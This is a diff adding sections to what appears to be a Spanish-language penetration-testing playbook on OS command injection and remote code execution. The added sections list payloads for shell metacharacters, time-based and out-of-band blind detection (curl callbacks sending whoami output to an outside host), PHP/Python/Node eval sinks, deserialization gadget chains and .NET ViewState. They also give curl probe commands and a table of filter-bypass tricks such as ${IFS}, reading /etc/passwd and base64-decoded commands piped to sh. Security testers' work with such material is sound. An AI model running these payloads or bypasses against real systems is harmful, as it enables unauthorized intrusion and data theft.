@@ -169,6 +169,57 @@ chains_with: [ssti, deserialization, sqli, lfi-rfi, ssrf]
 - Metasploit (`msfconsole -q -x "...; exit"` per project rules) — once a reliable RCE vector is
   confirmed and the operator has approved moving to a shell/session, not before.
 
+## Payloads & Detection Patterns
+
+Guía de caza: una familia por sink de ejecución. Para vectores ciegos (sin output reflejado), el
+único camino a `Demonstrated` es un callback correlacionado por token en el gate OOB.
+
+| Categoría | Shape | Propósito |
+|---|---|---|
+| Shell metachars | `;id`, `|id`, `` `id` ``, `$(id)`, `%0aid`, `&&id` | Encadenar comando OS al input |
+| Blind time-based | `;sleep 5`, `$(sleep 5)` | Confirmar ejecución ciega por latencia (con control) |
+| Blind OOB | `;curl http://TOKEN.oast/$(whoami)` | Prueba inequívoca vía callback con token |
+| PHP eval sink | `system("id");`, `phpinfo();`, `` `id` `` | Code injection en `eval`/`assert`/`preg_replace/e` |
+| Python eval/exec | `__import__('os').popen('id').read()` | Sink `eval`/`exec` |
+| Node | `require('child_process').execSync('id')` | Sink `eval`/`vm`/`child_process` |
+| Unsafe deserialization | Java `rO0AB...` (ysoserial CC6), PHP `O:8:...`, pickle `\x80\x04`, YAML `!!python/object/apply:os.system` | Gadget chain → RCE |
+| .NET ViewState | `ysoserial.net -g TypeConfuseDelegate -f BinaryFormatter` | Sin MAC o con `machineKey` filtrado |
+
+Surface signals que delatan la clase antes de inyectar:
+- Params que invocan binarios: ping/traceroute, convert/ffmpeg/ImageMagick, zip/unzip, git, filename de export.
+- Sinks en fuente: PHP `eval/assert/create_function`, Python `eval/exec/pickle.loads/yaml.load`, Node `eval/vm/child_process.exec`, Ruby `eval/Marshal.load`.
+- Magic bytes de blob serializado: `rO0AB` (Java), `O:` (PHP), `\x80` (pickle), `AAEAAAD` (.NET).
+- SSTI confirmado (Jinja2/Twig/FreeMarker/Velocity) → suele escalar directo a OS cmd.
+- Anomalías de timing en herramientas de diagnóstico de red.
+
+```bash
+# metachar probe: primero reflejado
+curl -s "https://target/ping?host=127.0.0.1;id" | grep -i 'uid='
+# blind OOB con token (gate obligatorio) — prueba inequívoca
+curl -s "https://target/ping?host=127.0.0.1;curl http://TOKEN.DOMAIN.oast.site/\$(whoami)"
+python3 -m engine.oast poll --audit-dir .
+```
+
+```bash
+# time-based con control de latencia (descarta backend lento)
+time curl -s "https://target/ping?host=127.0.0.1" -o /dev/null           # control
+time curl -s "https://target/ping?host=127.0.0.1;sleep 5" -o /dev/null    # payload
+```
+
+## Bypass Techniques
+
+Agrupadas por la defensa que evaden; probar la familia completa antes de concluir que el sink está muerto.
+
+| Filtro evadido | Técnica | Notas |
+|---|---|---|
+| Blocklist de `;`/`|` | Separadores alternos `%0a` (newline), `&&`, `||`, `$(...)`, `` `...` `` | Varía por shell |
+| Espacios filtrados | `${IFS}`, `{cat,/etc/passwd}`, `<`, tabs `%09` | Reconstruir args sin espacio |
+| Blocklist de keywords | `c''at`, `ca\t`, wildcard `/???/??t`, base64 `$(echo ...|base64 -d|sh)` | Evita el match de `cat`/`curl`/`wget` |
+| Sin output reflejado | Redirigir `2>&1`, OOB exfil, time-based | Blind: confirmar por callback/latencia |
+| Deserializer con allowlist | Probar varias gadget chains por marcador OOB | Cada chain es un test discreto, no scanning |
+| ViewState con MAC | Requiere `machineKey` filtrado (info-disclosure), nunca brute fuera de scope | Sin la key, degradar a Inferred |
+| WAF sobre el param | Mover a header/body, encoding, URI injection de framework (Camel `#class:`) | Middleware que concatena a URI interna |
+
 ## Root Causes
 
 - Shelling out via string-concatenated commands (`os.system(f"ping {host}")`,
